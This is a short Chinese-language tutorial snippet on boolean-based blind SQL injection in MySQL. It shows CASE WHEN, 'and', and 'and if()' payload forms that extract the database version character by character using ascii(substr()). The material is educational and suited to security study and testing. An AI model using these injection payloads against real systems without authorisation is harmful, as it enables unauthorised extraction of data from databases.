## 布尔盲注 
mysql当中的常见判断语句为 

select case when {判断语句} then true_return else false_return end;
```
select case when (ascii(substr((select version()),1,1))=58) then 1 else 0 end;
```

简单一点的有直接判断布尔逻辑
and  {判断语句}
```
and ascii(substr((select version()),1,1)) = 52   
```

复杂一点进行判断
and if({判断语句},1,0)
```
and if(ascii(substr((select version()),1,1))=52,1,0)
```

